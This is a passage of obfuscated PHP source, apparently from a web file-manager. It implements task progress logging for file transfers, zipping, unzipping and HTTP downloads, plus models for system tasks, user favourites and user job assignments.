$_SERVER[¼’ç§¼´]; $ûÍÎî– =& $this->task; $ûÍÎî–[$²öÔ¤İÅ[1838]] = $ûÍÎî–[$²öÔ¤İÅ[1837]]; $ûÍÎî–[$²öÔ¤İÅ[1839]] = $²öÔ¤İÅ[12]; unset($ûÍÎî–[$²öÔ¤İÅ[1808]]); if ($œüØà“Ü == $ûÍÎî–[$²öÔ¤İÅ[1835]]) { $ûÍÎî–[$²öÔ¤İÅ[1841]] += $ûÍÎî–[$²öÔ¤İÅ[1837]]; $ûÍÎî–[$²öÔ¤İÅ[1842]] = $ûÍÎî–[$²öÔ¤İÅ[1841]]; $½¿ˆ²Ò = 1; if (isset($ûÍÎî–[$²öÔ¤İÅ[1848]]) && $ûÍÎî–[$²öÔ¤İÅ[1848]] == $ˆ¯®¥ßÀ) { $½¿ˆ²Ò = 0; } $this->update($½¿ˆ²Ò); } else { $this->update(); $ûÍÎî–[$²öÔ¤İÅ[1838]] = 0; } Cache::remove($ûÍÎî–[$²öÔ¤İÅ[486]] . $²öÔ¤İÅ[1851]); self::log($²öÔ¤İÅ[1854] . $ˆ¯®¥ßÀ . $²öÔ¤İÅ[73] . $¶çÙ€”í . $²öÔ¤İÅ[287] . $œüØà“Ü . $²öÔ¤İÅ[1855] . $ûÍÎî–[$²öÔ¤İÅ[1835]]); } public function updateFileEnd($¿ííÈ, $‰÷æ½‹ş) { $úÌøô™ =& $_SERVER[¼’ç§¼´]; $‰–•ü¬ =& $this->task; $‰–•ü¬[$úÌøô™[1835]] = $¿ííÈ; $‰–•ü¬[$úÌøô™[1837]] = $‰÷æ½‹ş; $‰–•ü¬[$úÌøô™[1841]] += $‰÷æ½‹ş; $‰–•ü¬[$úÌøô™[1842]] = $‰–•ü¬[$úÌøô™[1841]]; $this->update(1); self::log($úÌøô™[1856] . $¿ííÈ); } public function sourceModelCopy($ÏÃòë·ş) { $‰µöÊ¤ =& $_SERVER[¼’ç§¼´]; $ø×öÃ‚Ú = $ÏÃòë·ş[0]; $Ç÷‚•ì  = $ÏÃòë·ş[1]; $°¤à™š =& $this->task; $this->sourceModelCopyFlag = !0; $ ×šƒ¢º = 0; switch ($ø×öÃ‚Ú) { case $‰µöÊ¤[649]: $ ×šƒ¢º = 1; break; case $‰µöÊ¤[652]: $°¤à™š[$‰µöÊ¤[1835]] = $Ç÷‚•ì [$‰µöÊ¤[32]]; break; case $‰µöÊ¤[654]: $ ×šƒ¢º = intval($ÏÃòë·ş[$‰µöÊ¤[467]] * 0.4); break; case $‰µöÊ¤[656]: $ ×šƒ¢º = intval($ÏÃòë·ş[$‰µöÊ¤[467]] * 0.2); break; case $‰µöÊ¤[658]: $ ×šƒ¢º = intval($ÏÃòë·ş[$‰µöÊ¤[467]] * 0.4); break; } $this->update($ ×šƒ¢º); $this->sourceModelCopyFlag = !1; } public function sourceRemove($‹Š£Œ±¤, $•‘ƒ•¸) { $ßô¥®Ğ =& $_SERVER[¼’ç§¼´]; $this->sourceModelCopyFlag = !0; $ì§¦»‹Ä = 1; if (isset($‹Š£Œ±¤[$ßô¥®Ğ[82]])) { $ì§¦»‹Ä = $‹Š£Œ±¤[$ßô¥®Ğ[82]][$ßô¥®Ğ[80]]; $ì§¦»‹Ä = $ì§¦»‹Ä + $‹Š£Œ±¤[$ßô¥®Ğ[82]][$ßô¥®Ğ[81]] + 1; } $this->update($ì§¦»‹Ä); $this->sourceModelCopyFlag = !1; } public function sourceMove($Â«‡Ş‘İ) { $this->sourceRemove($Â«‡Ş‘İ, !1); } public function curlProgress($¸”ä»×Ì, $è™ŒÙ”¥, $ËúÊ¨ŞÇ, $ØÎŒ², $Ã©ÍÕØû) { $§ûœ´Ÿè =& $_SERVER[¼’ç§¼´]; $ñŞ÷Õ±¥ =& $this->task; if ($Ã©ÍÕØû > 0) { $ñŞ÷Õ±¥[$§ûœ´Ÿè[1151]] = $§ûœ´Ÿè[1857]; $ñŞ÷Õ±¥[$§ûœ´Ÿè[1839]] = $§ûœ´Ÿè[110]; if ($ñŞ÷Õ±¥[$§ûœ´Ÿè[1837]]) { $ñŞ÷Õ±¥[$§ûœ´Ÿè[1838]] = $Ã©ÍÕØû; } if ($ñŞ÷Õ±¥[$§ûœ´Ÿè[1840]]) { $ñŞ÷Õ±¥[$§ûœ´Ÿè[1838]] = $Ã©ÍÕØû + $ñŞ÷Õ±¥[$§ûœ´Ÿè[1840]]; } } else { if ($ËúÊ¨ŞÇ > 0) { if ($ñŞ÷Õ±¥[$§ûœ´Ÿè[1837]] == $è™ŒÙ”¥) { $ñŞ÷Õ±¥[$§ûœ´Ÿè[1838]] = $ËúÊ¨ŞÇ; $ñŞ÷Õ±¥[$§ûœ´Ÿè[1151]] = $§ûœ´Ÿè[1858]; $ñŞ÷Õ±¥[$§ûœ´Ÿè[1839]] = $§ûœ´Ÿè[1288]; } } } $this->update(); } public function curlProgressStart($ˆİÜäú) { } public function curlProgressEnd($³©¦¯¹Å) { $ü¤í”ˆ =& $_SERVER[¼’ç§¼´]; $´±«Áı€ =& $this->task; $§‡ñ‹ú‹ = curl_getinfo($³©¦¯¹Å); $Ä¡ÒØÚ = $§‡ñ‹ú‹[$ü¤í”ˆ[1859]]; if ($Ä¡ÒØÚ == -1) { $Ä¡ÒØÚ = $§‡ñ‹ú‹[$ü¤í”ˆ[1860]]; } if ($´±«Áı€[$ü¤í”ˆ[1839]] == $ü¤í”ˆ[110] && $Ä¡ÒØÚ) { $´±«Áı€[$ü¤í”ˆ[1840]] += $Ä¡ÒØÚ; } $this->update(); } } class TaskHttp extends Task { protected function startAfter() { $Æøªä› =& $_SERVER[¼’ç§¼´]; $Ã¥ä‘é =& $this->task; $Ã¥ä‘é[$Æøªä›[1861]] = 1; Hook::bind($Æøªä›[1829], array($this, $Æøªä›[1862])); Hook::bind($Æøªä›[1831], array($this, $Æøªä›[1863])); Hook::bind($Æøªä›[1833], array($this, $Æøªä›[1864])); } protected function endAfter() { $ï†êãÓ£ =& $_SERVER[¼’ç§¼´]; Hook::unbind($ï†êãÓ£[1829], array($this, $ï†êãÓ£[1862])); Hook::unbind($ï†êãÓ£[1831], array($this, $ï†êãÓ£[1863])); Hook::unbind($ï†êãÓ£[1833], array($this, $ï†êãÓ£[1864])); } public function progressStart($üıüÏÒª) { $ÈõëÓç˜ =& $_SERVER[¼’ç§¼´]; $üù«ß³ = curl_getinfo($üıüÏÒª); self::log($ÈõëÓç˜[1865] . $üù«ß³[$ÈõëÓç˜[384]]); self::valueSet($this->task[$ÈõëÓç˜[486]], $this->task); } public function progressEnd($çİâ©­§) { $‡úæŸŞ =& $_SERVER[¼’ç§¼´]; self::log($‡úæŸŞ[1866] . $this->task[$‡úæŸŞ[486]]); $this->end(); } public function progress($ËìË¯›Ò, $Ùé·êè, $Å¹öà¸, $Êñ¦îÒ, $Û©õÕƒç) { $•„˜èèÓ =& $_SERVER[¼’ç§¼´]; $ø³©ÇÒû =& $this->task; if ($Û©õÕƒç > 0) { $ø³©ÇÒû[$•„˜èèÓ[1149]] = $ø³©ÇÒû[$•„˜èèÓ[1149]] == 0 ? $Êñ¦îÒ : $ø³©ÇÒû[$•„˜èèÓ[1149]]; $ø³©ÇÒû[$•„˜èèÓ[1784]] = $Û©õÕƒç; } else { if ($Å¹öà¸ > 0) { $ø³©ÇÒû[$•„˜èèÓ[1149]] = $ø³©ÇÒû[$•„˜èèÓ[1149]] == 0 ? $Ùé·êè : $ø³©ÇÒû[$•„˜èèÓ[1149]]; $ø³©ÇÒû[$•„˜èèÓ[1784]] = $Å¹öà¸; } } $this->update(); self::log("\160\x72\157\x67\x72\145\163\163\110\x74\164\160\x3a\x64\157\x77\156\x3a{$Å¹öà¸}\57{$Ùé·êè}\x3b\40\x75\160\x6c\x6f\x61\x64\x3a{$Û©õÕƒç}\57{$Êñ¦îÒ}\73"); } } class TaskLog { private $task; private $taskID; private $isEnd = false; static function newTask($¯«íƒÖí, $ªÂé²Ş‡ = '', $úª‡¬äª = 0, $ıŒ„¡ÉÔ = '') { $ïŒƒÉ¸ =& $_SERVER[¼’ç§¼´]; $ıŒ„¡ÉÔ = $ıŒ„¡ÉÔ ? $ıŒ„¡ÉÔ : ($ªÂé²Ş‡ ? $ªÂé²Ş‡ : $¯«íƒÖí); $Í¢ÊÁ–Ñ = new Task($¯«íƒÖí, $ªÂé²Ş‡, $úª‡¬äª, $ıŒ„¡ÉÔ); $GLOBALS[$ïŒƒÉ¸[1867] . $¯«íƒÖí] = new TaskLog($ïŒƒÉ¸[1766], $Í¢ÊÁ–Ñ, $ıŒ„¡ÉÔ); return $Í¢ÊÁ–Ñ; } public function __construct($‚„öÜå÷ = '', $ìÒ±İø‘ = '', $óé—ˆÒ = '') { $Úë¸ÏÑõ =& $_SERVER[¼’ç§¼´]; if (!$‚„öÜå÷) { $‚„öÜå÷ = $Úë¸ÏÑõ[1766]; } $…§ÏÊµå = $‚„öÜå÷ . $Úë¸ÏÑõ[473] . rand_string(10); if (!$óé—ˆÒ) { $óé—ˆÒ = $‚„öÜå÷ . $Úë¸ÏÑõ[53] . $óé—ˆÒ; } switch ($‚„öÜå÷) { case $Úë¸ÏÑõ[1766]: if (!$ìÒ±İø‘ || !$ìÒ±İø‘->task) { return echoLog($‚„öÜå÷ . $Úë¸ÏÑõ[1868]); } $æ°åû½Á = $ìÒ±İø‘; $…§ÏÊµå = $æ°åû½Á->task[$Úë¸ÏÑõ[486]]; $‚„öÜå÷ = $æ°åû½Á->task[$Úë¸ÏÑõ[486]]; if (!$æ°åû½Á->task[$Úë¸ÏÑõ[1671]]) { $æ°åû½Á->task[$Úë¸ÏÑõ[1671]] = $óé—ˆÒ ? $óé—ˆÒ : $‚„öÜå÷; } break; case $Úë¸ÏÑõ[1869]: if (!$ìÒ±İø‘) { return echoLog($‚„öÜå÷ . $Úë¸ÏÑõ[1870]); } $Í†Ş‘—Ò = is_string($ìÒ±İø‘) ? array($ìÒ±İø‘) : $ìÒ±İø‘; $æ°åû½Á = new TaskFileTransfer($…§ÏÊµå, $‚„öÜå÷, 0, $óé—ˆÒ ? $óé—ˆÒ : $Í†Ş‘—Ò[0]); foreach ($Í†Ş‘—Ò as $ğ÷ÛÈŒà) { $æ°åû½Á->addPath($ğ÷ÛÈŒà); } break; case $Úë¸ÏÑõ[390]: if (!$ìÒ±İø‘) { return echoLog($‚„öÜå÷ . $Úë¸ÏÑõ[1870]); } $Í†Ş‘—Ò = is_string($ìÒ±İø‘) ? array($ìÒ±İø‘) : $ìÒ±İø‘; $æ°åû½Á = new TaskZip($…§ÏÊµå, $‚„öÜå÷, 0, $óé—ˆÒ ? $óé—ˆÒ : $Í†Ş‘—Ò[0]); foreach ($Í†Ş‘—Ò as $ğ÷ÛÈŒà) { $æ°åû½Á->addPath($ğ÷ÛÈŒà); } break; case $Úë¸ÏÑõ[1308]: if (!$ìÒ±İø‘) { return echoLog($‚„öÜå÷ . $Úë¸ÏÑõ[1870]); } $æ°åû½Á = new TaskUnZip($…§ÏÊµå, $‚„öÜå÷, 0, $óé—ˆÒ ? $óé—ˆÒ : $ìÒ±İø‘); if ($ìÒ±İø‘) { $æ°åû½Á->addFile($ìÒ±İø‘); } break; case $Úë¸ÏÑõ[152]: $æ°åû½Á = new TaskHttp($…§ÏÊµå, $‚„öÜå÷); break; default: return; break; } $this->task = $æ°åû½Á; $this->taskID = $…§ÏÊµå; Hook::bind($Úë¸ÏÑõ[1804], array($this, $Úë¸ÏÑõ[1871])); Hook::bind($Úë¸ÏÑõ[1806], array($this, $Úë¸ÏÑõ[1872])); Hook::bind($Úë¸ÏÑõ[1800], array($this, $Úë¸ÏÑõ[1873])); echoLog($Úë¸ÏÑõ[1874] . $æ°åû½Á->task[$Úë¸ÏÑõ[1671]]); } public function __destruct() { $this->end(); } public function end($ğÅ‰ï­ô = '') { $°ë«‡Å =& $_SERVER[¼’ç§¼´]; if ($this->isEnd) { return; } if (!$this->task || !$this->taskID) { return; } $this->isEnd = !0; $this->task->end($ğÅ‰ï­ô); $this->task = !1; $this->taskID = !1; Hook::unbind($°ë«‡Å[1804], array($this, $°ë«‡Å[1871])); Hook::unbind($°ë«‡Å[1806], array($this, $°ë«‡Å[1872])); Hook::unbind($°ë«‡Å[1800], array($this, $°ë«‡Å[1873])); } public function taskUpdate($¯ËéË¹) { $Õ´ŞÒğ =& $_SERVER[¼’ç§¼´]; if (!$¯ËéË¹ || $this->taskID != $¯ËéË¹[$Õ´ŞÒğ[486]]) { return; } $óÁ’Ùœ€ = 20; $ãóì¦‡ = intval($¯ËéË¹[$Õ´ŞÒğ[1785]] * $óÁ’Ùœ€); $ªãôó€à = $Õ´ŞÒğ[176] . str_repeat($Õ´ŞÒğ[517], $ãóì¦‡) . $Õ´ŞÒğ[1100] . str_repeat($Õ´ŞÒğ[53], $óÁ’Ùœ€ - $ãóì¦‡) . $Õ´ŞÒğ[178]; $ËÇ‡ãæ‡ = $ªãôó€à . sprintf($Õ´ŞÒğ[1875], $¯ËéË¹[$Õ´ŞÒğ[1785]] * 100) . $Õ´ŞÒğ[1876]; $ì¿Ôì½ƒ = $ËÇ‡ãæ‡ . $¯ËéË¹[$Õ´ŞÒğ[1784]] . $Õ´ŞÒğ[8] . $¯ËéË¹[$Õ´ŞÒğ[1149]] . LNG($Õ´ŞÒğ[1877]); $¦ÛéÓğé = $Õ´ŞÒğ[12]; if ($¯ËéË¹[$Õ´ŞÒğ[1861]]) { $ì¿Ôì½ƒ = $ËÇ‡ãæ‡ . size_format($¯ËéË¹[$Õ´ŞÒğ[1784]]) . $Õ´ŞÒğ[8] . size_format($¯ËéË¹[$Õ´ŞÒğ[1149]]); $¦ÛéÓğé = size_format($¯ËéË¹[$Õ´ŞÒğ[1786]]) . $Õ´ŞÒğ[1878]; } if ($¯ËéË¹[$Õ´ŞÒğ[1151]]) { $¯ËéË¹[$Õ´ŞÒğ[1835]] = $¯ËéË¹[$Õ´ŞÒğ[1151]] . $Õ´ŞÒğ[53] . $¯ËéË¹[$Õ´ŞÒğ[1835]]; } if ($¯ËéË¹[$Õ´ŞÒğ[1835]]) { $š¯ñÙËó = $Õ´ŞÒğ[12]; if ($¯ËéË¹[$Õ´ŞÒğ[1837]]) { $š¯ñÙËó = $Õ´ŞÒğ[50] . size_format($¯ËéË¹[$Õ´ŞÒğ[1838]]) . $Õ´ŞÒğ[8] . size_format($¯ËéË¹[$Õ´ŞÒğ[1837]]); } $¦ÛéÓğé .= $¯ËéË¹[$Õ´ŞÒğ[1835]] . $š¯ñÙËó; } if ($¯ËéË¹[$Õ´ŞÒğ[851]] && !$¯ËéË¹[$Õ´ŞÒğ[1837]]) { $¦ÛéÓğé .= $Õ´ŞÒğ[53] . size_format($¯ËéË¹[$Õ´ŞÒğ[1842]]) . $Õ´ŞÒğ[8] . size_format($¯ËéË¹[$Õ´ŞÒğ[851]]); } echoLog($ì¿Ôì½ƒ . $Õ´ŞÒğ[53] . $¦ÛéÓğé, !0); } public function taskEnd($ß¤Üñ‡ğ) { $ííæÆ­á =& $_SERVER[¼’ç§¼´]; if (!$ß¤Üñ‡ğ || $this->taskID != $ß¤Üñ‡ğ[$ííæÆ­á[486]]) { return; } $ôØ÷ê› = $ß¤Üñ‡ğ ? LNG($ííæÆ­á[1879]) . $ííæÆ­á[4] . $ß¤Üñ‡ğ[$ííæÆ­á[1784]] . $ííæÆ­á[8] . $ß¤Üñ‡ğ[$ííæÆ­á[1149]] . LNG($ííæÆ­á[1877]) . $ííæÆ­á[74] : $ííæÆ­á[12]; echoLog($ííæÆ­á[1880] . $ß¤Üñ‡ğ[$ííæÆ­á[1671]] . ($ß¤Üñ‡ğ[$ííæÆ­á[537]] ? $ííæÆ­á[74] . $ß¤Üñ‡ğ[$ííæÆ­á[537]] : $ííæÆ­á[12]) . $ííæÆ­á[74] . $ôØ÷ê› . $ííæÆ­á[1881] . sprintf($ííæÆ­á[940], timeFloat() - $ß¤Üñ‡ğ[$ííæÆ­á[1787]]) . $ííæÆ­á[1799]); $this->end(); } public function taskKill($ÌØØ–‹) { $¬¾†Ìò =& $_SERVER[¼’ç§¼´]; if (!$ÌØØ–‹ || $this->taskID != $ÌØØ–‹[$¬¾†Ìò[486]]) { return; } echoLog($¬¾†Ìò[1882] . $ÌØØ–‹[$¬¾†Ìò[1671]]); } } goto E”šÇÊï‰ ; A¿è¡ß—¬ø: class SystemTaskModel extends ModelBaseLight { public $optionType = "\x53\171\x73\x74\x65\155\56\x74\141\163\x6b\x4c\x69\163\164"; public $field = array("\156\141\155\145", "\x74\x79\x70\145", "\145\x76\x65\x6e\164", "\164\x69\155\x65", "\x64\x65\163\x63", "\x73\171\163\164\x65\155", "\x65\x6e\141\142\x6c\145", "\x6c\141\x73\x74\122\165\156", "\x73\157\162\x74"); public function listData($ªçÊº“Ì = false, $ğ´ªõåÛ = "\x73\157\162\164", $¡¯Îı® = false) { return parent::listData($ªçÊº“Ì, $ğ´ªõåÛ, $¡¯Îı®); } public function add($˜Ğì“êò) { $àà˜æÒ =& $_SERVER[¼’ç§¼´]; $§šÃƒ…é = $this->findByName($˜Ğì“êò[$àà˜æÒ[32]]); if ($§šÃƒ…é) { return !1; } $˜Ğì“êò[$àà˜æÒ[1733]] = 0; $˜Ğì“êò[$àà˜æÒ[2008]] = $this->getSort(); return parent::insert($˜Ğì“êò); } private function getSort() { $ö—áò¦¢ =& $_SERVER[¼’ç§¼´]; $Şó¾Ñ©Ç = parent::listData(); $ÁÛä›¨› = array_to_keyvalue($Şó¾Ñ©Ç, $ö—áò¦¢[12], $ö—áò¦¢[2008]); return empty($ÁÛä›¨›) ? 0 : max($ÁÛä›¨›) + 1; } public function update($ÈÀé±şç, $üÙŒàÒš) { $ÑÑ½¥ñß =& $_SERVER[¼’ç§¼´]; $„ÒÚ¾ìá = $this->listData($ÈÀé±şç); $üˆÕù½ = $this->findByName($üÙŒàÒš[$ÑÑ½¥ñß[32]]); if (!$„ÒÚ¾ìá || $üˆÕù½ && $üˆÕù½[$ÑÑ½¥ñß[486]] != $„ÒÚ¾ìá[$ÑÑ½¥ñß[486]]) { return !1; } return parent::update($ÈÀé±şç, $üÙŒàÒš); } public function remove($‘³ úàƒ, $“­… õù = false) { $€›¹¨œ§ =& $_SERVER[¼’ç§¼´]; $’³ƒÜ» = $this->listData($‘³ úàƒ); if (!$’³ƒÜ») { return; } if (!$“­… õù && $’³ƒÜ»[$€›¹¨œ§[191]] == $€›¹¨œ§[91]) { return !1; } return parent::remove($‘³ úàƒ); } public function enable($ĞÂÃéİŸ, $õ»êÈßƒ) { return $this->update($ĞÂÃéİŸ, array($_SERVER[¼’ç§¼´][2458] => $õ»êÈßƒ)); } public function run($ùî¨Úœª) { return $this->update($ùî¨Úœª, array($_SERVER[¼’ç§¼´][2470] => time())); } } class UserFavModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\146\141\166"; protected function cacheFunctionAlias($í¯ñÏóÈ) { $´ïùŸÚ =& $_SERVER[¼’ç§¼´]; return array($´ïùŸÚ[2099] => array(USER_ID, $´ïùŸÚ[2471])); } protected function listData() { $×ùĞèıº =& $_SERVER[¼’ç§¼´]; $Ş¯ÆÒÍÆ = array($×ùĞèıº[1774] => USER_ID, $×ùĞèıº[568] => 0); $¦¢„„ì¦ = $×ùĞèıº[2472]; $·‹Œ…Úõ = $this->field($¦¢„„ì¦)->where($Ş¯ÆÒÍÆ)->order($×ùĞèıº[2473])->select(); return $·‹Œ…Úõ ? $·‹Œ…Úõ : array(); } protected function resetCache() { } protected function listView() { $åœêÊ– =& $_SERVER[¼’ç§¼´]; $òÒÙ·«œ = $this->listData(); $“Â¶±®˜ = array_filter_by_field($òÒÙ·«œ, $åœêÊ–[33], $åœêÊ–[501]); $Á»äù›÷ = array_to_keyvalue($“Â¶±®˜, $åœêÊ–[12], $åœêÊ–[87]); if (!$Á»äù›÷) { return $òÒÙ·«œ; } $çæ¾ÊÊÚ = 2000; $°…ö¾­  = array($åœêÊ–[502] => array($åœêÊ–[503], $Á»äù›÷)); $÷‡Š¼´¾ = Model($åœêÊ–[913])->listSource($°…ö¾­ , $çæ¾ÊÊÚ); $÷‡Š¼´¾ = array_merge($÷‡Š¼´¾[$åœêÊ–[86]], $÷‡Š¼´¾[$åœêÊ–[85]]); $÷‡Š¼´¾ = array_to_keyvalue($÷‡Š¼´¾, $åœêÊ–[193]); foreach ($òÒÙ·«œ as $ÙúÒ­Šä => $È×é´Ÿ) { $…¥å¯úÔ = $÷‡Š¼´¾[$È×é´Ÿ[$åœêÊ–[87]]]; $…¥å¯úÔ = $…¥å¯úÔ ? $…¥å¯úÔ : array(); $òÒÙ·«œ[$ÙúÒ­Šä] = array_merge($…¥å¯úÔ, $È×é´Ÿ); } return $òÒÙ·«œ; } protected function addFav($ÚÉğ¦™ö, $€ûÔ×ñ = '', $ì–È¬Õˆ = "\x73\x6f\165\x72\x63\145") { $‰õé´æÄ =& $_SERVER[¼’ç§¼´]; $ñµÚ‘¸Š = array($‰õé´æÄ[1774] => USER_ID, $‰õé´æÄ[568] => 0, $‰õé´æÄ[507] => $ì–È¬Õˆ, $‰õé´æÄ[506] => $ÚÉğ¦™ö); if ($this->where($ñµÚ‘¸Š)->find()) { return !1; } $ñµÚ‘¸Š = array($‰õé´æÄ[1774] => USER_ID, $‰õé´æÄ[568] => 0); $ÁÖŒğœ = $this->where($ñµÚ‘¸Š)->max($‰õé´æÄ[2008]); if (!$ÁÖŒğœ) { $ÁÖŒğœ = 0; } if (!$€ûÔ×ñ && $ì–È¬Õˆ == $‰õé´æÄ[501]) { $óº°ª× = Model($‰õé´æÄ[1430])->where(array($‰õé´æÄ[502] => $ÚÉğ¦™ö))->find(); if (!$óº°ª×) { return !1; } $€ûÔ×ñ = $óº°ª×[$‰õé´æÄ[32]]; } $€ûÔ×ñ = $this->getAutoName($€ûÔ×ñ); $ñÅÌş = array($‰õé´æÄ[1774] => USER_ID, $‰õé´æÄ[568] => 0, $‰õé´æÄ[505] => $€ûÔ×ñ, $‰õé´æÄ[506] => $ÚÉğ¦™ö, $‰õé´æÄ[507] => $ì–È¬Õˆ, $‰õé´æÄ[1988] => $ÁÖŒğœ + 1); return $this->add($ñÅÌş); } protected function remove($°Äƒ›¢½) { $ş–Â½‘Æ =& $_SERVER[¼’ç§¼´]; $à¿€ÀÖÇ = array($ş–Â½‘Æ[1774] => USER_ID, $ş–Â½‘Æ[504] => $°Äƒ›¢½); return $this->where($à¿€ÀÖÇ)->delete(); } protected function removeByName($ç±¿‚ÖË) { $ÙàÀ£Şî =& $_SERVER[¼’ç§¼´]; $”ëşË÷ú = array($ÙàÀ£Şî[1774] => USER_ID, $ÙàÀ£Şî[505] => $ç±¿‚ÖË, $ÙàÀ£Şî[568] => 0); return $this->where($”ëşË÷ú)->delete(); } protected function rename($ïôƒˆŞĞ, $ÔÅèßìÛ) { $¶Í¶é =& $_SERVER[¼’ç§¼´]; if ($ïôƒˆŞĞ == $ÔÅèßìÛ) { return !1; } $š¯ù‰çÄ = $this->getAutoName($ÔÅèßìÛ); if ($ÔÅèßìÛ != $š¯ù‰çÄ) { return !1; } $ÁĞÜÏ  = array($¶Í¶é[1774] => USER_ID, $¶Í¶é[568] => 0, $¶Í¶é[32] => $ïôƒˆŞĞ); return $this->where($ÁĞÜÏ )->save(array($¶Í¶é[32] => $ÔÅèßìÛ)); } protected function resetSort($‰ÔÆ¥øÚ) { $ı¹êÉø¨ =& $_SERVER[¼’ç§¼´]; $‰ÔÆ¥øÚ = is_array($‰ÔÆ¥øÚ) ? $‰ÔÆ¥øÚ : array(); $àÍŒÆò¯ = array($ı¹êÉø¨[1774] => USER_ID); for ($ãç–è¿½ = 0; $ãç–è¿½ < count($‰ÔÆ¥øÚ); $ãç–è¿½++) { $àÍŒÆò¯[$ı¹êÉø¨[504]] = $‰ÔÆ¥øÚ[$ãç–è¿½]; $this->where($àÍŒÆò¯)->save(array($ı¹êÉø¨[1988] => $ãç–è¿½ + 1)); } return !0; } protected function moveTop($¹¶Ì’ÚÄ) { $úÕ€Æô¥ =& $_SERVER[¼’ç§¼´]; $Ûü¿¦ù“ = array($úÕ€Æô¥[1774] => USER_ID, $úÕ€Æô¥[568] => 0); $Ì‰åÎÙ¬ = $this->where($Ûü¿¦ù“)->where(array($úÕ€Æô¥[32] => $¹¶Ì’ÚÄ))->find(); if (!$Ì‰åÎÙ¬) { return; } $şÊ¨ˆšØ = $this->field($úÕ€Æô¥[486])->where($Ûü¿¦ù“)->order($úÕ€Æô¥[2473])->select(); $şÊ¨ˆšØ = array_to_keyvalue($şÊ¨ˆšØ, $úÕ€Æô¥[12], $úÕ€Æô¥[486]); $µ´Ùú´… = $şÊ¨ˆšØ; $şÊ¨ˆšØ = array_remove_value($şÊ¨ˆšØ, $Ì‰åÎÙ¬[$úÕ€Æô¥[486]]); array_unshift($şÊ¨ˆšØ, $Ì‰åÎÙ¬[$úÕ€Æô¥[486]]); return $this->resetSort($şÊ¨ˆšØ); } protected function moveBottom($¬ûñ”ä›) { $åøËà«Ü =& $_SERVER[¼’ç§¼´]; $ó¦†â®™ = array($åøËà«Ü[1774] => USER_ID, $åøËà«Ü[568] => 0); $´öü«à‰ = $this->where($ó¦†â®™)->max($åøËà«Ü[2008]); $ÄàÄ½©˜ = array($åøËà«Ü[2008] => $´öü«à‰ + 1); return $this->where($ó¦†â®™)->where(array($åøËà«Ü[32] => $¬ûñ”ä›))->save($ÄàÄ½©˜); } private function getAutoName($ÊŒÌ¾ÄŒ) { $ëñøº¥ =& $_SERVER[¼’ç§¼´]; $‹í·©ã­ = array($ëñøº¥[1774] => USER_ID, $ëñøº¥[568] => 0); $À§¼€— = $this->field($ëñøº¥[32])->where($‹í·©ã­)->select(); $À§¼€— = array_to_keyvalue($À§¼€—, $ëñøº¥[12], $ëñøº¥[32]); if (!$À§¼€— || !in_array($ÊŒÌ¾ÄŒ, $À§¼€—)) { return $ÊŒÌ¾ÄŒ; } for ($’§Ÿ§¸À = 0; $’§Ÿ§¸À < count($À§¼€—); $’§Ÿ§¸À++) { if (!in_array($ÊŒÌ¾ÄŒ . "\50{$’§Ÿ§¸À}\x29", $À§¼€—)) { return $ÊŒÌ¾ÄŒ . "\x28{$’§Ÿ§¸À}\51"; } } return $ÊŒÌ¾ÄŒ . "\50{$’§Ÿ§¸À}\x29"; } } class UserJobModel extends ModelBaseLight { public $optionType = "\123\171\x73\164\145\155\x2e\152\157\x62\114\151\163\x74"; public $field = array("\x6e\x61\x6d\x65", "\x64\145\x73\x63", "\163\x6f\162\x74"); const JOB_KEY = "\x73\145\x6c\x66\x4a\157\x62\114\151\x73\x74"; public function listData($¡’İ‚´ì = false, $½ãêÅº¾ = "\x73\157\x72\x74", $æØ”ó»û = false) { return parent::listData($¡’İ‚´ì, $½ãêÅº¾, $æØ”ó»û); } public function remove($Êİ²–³•) { return parent::remove($Êİ²–³•); } public function add($¬çç›Ú) { $¯Û¾¶ñ =& $_SERVER[¼’ç§¼´]; if ($this->findByName($¬çç›Ú[$¯Û¾¶ñ[32]])) { return !1; } $¬çç›Ú[$¯Û¾¶ñ[2008]] = $this->getSort(); return parent::insert($¬çç›Ú); } private function getSort() { $úøİ³Ü =& $_SERVER[¼’ç§¼´]; $ıÆ®Ÿ¬“ = parent::listData(); $ííÂæ§¹ = array_to_keyvalue($ıÆ®Ÿ¬“, $úøİ³Ü[12], $úøİ³Ü[2008]); return empty($ííÂæ§¹) ? 0 : max($ííÂæ§¹) + 1; } public function update($ŒšÅŞ, $ñ¶èÕÂÍ) { $Å–ª­ƒ =& $_SERVER[¼’ç§¼´]; $³ûî€ÇŞ = parent::listData($ŒšÅŞ); $«¶òñœÎ = $this->findByName($ñ¶èÕÂÍ[$Å–ª­ƒ[32]]); if (!$³ûî€ÇŞ || $«¶òñœÎ && $«¶òñœÎ[$Å–ª­ƒ[486]] != $³ûî€ÇŞ[$Å–ª­ƒ[486]]) { return !1; } return parent::update($ŒšÅŞ, $ñ¶èÕÂÍ); } public function setUserJob($ıµ¥Ú´, $³à·á©) { $ê‹’¢Õ =& $_SERVER[¼’ç§¼´]; if (!is_array($³à·á©)) { $³à·á© = array($³à·á©); } $Ë®£†£ò = parent::listData(); $ÎñÑåõ‹ = array_to_keyvalue($Ë®£†£ò, $ê‹’¢Õ[32]); $Ä‹ßõ‘¹ = $ê‹’¢Õ[465]; foreach ($³à·á© as $şï®ÏĞ©) { if ($ÎñÑåõ‹[$şï®ÏĞ©]) { $Ä‹ßõ‘¹ .= $ÎñÑåõ‹[$şï®ÏĞ©][$ê‹’¢Õ[486]] . $ê‹’¢Õ[50]; } else { $¼®Û˜‚ = $this->add($şï®ÏĞ©); $Ä‹ßõ‘¹ .= $¼®Û˜‚ . $ê‹’¢Õ[50]; } } $Ä‹ßõ‘¹ = rtrim($Ä‹ßõ‘¹, $ê‹’¢Õ[50]); Model($ê‹’¢Õ[608])->metaSet($ıµ¥Ú´, self::JOB_KEY, $Ä‹ßõ‘¹); } public function getUserJob($Üİ§‘ç‡) { $Ÿ¼é§Õô = Model($_SERVER[¼’ç§¼´][608])->metaGet($Üİ§‘ç‡); return $this->getUserJobInfo($Ÿ¼é§Õô[self::JOB_KEY]); } public function getUserJobInfo($ö‚¥ìÒ¹) { $êÁâ ¸£ =& $_SERVER[¼’ç§¼´]; $É·¾‰’« = explode($êÁâ ¸£[50], $ö‚¥ìÒ¹); $“ãš¤² = parent::listData(); $“ãš¤² = array_remove_key($“ãš¤², $êÁâ ¸£[233]); $µşÈÎĞÒ = array(); foreach ($É·¾‰’« as $¥Ö—òŠæ) { if (isset($“ãš¤²[$¥Ö—òŠæ])) { $µşÈÎĞÒ[] = 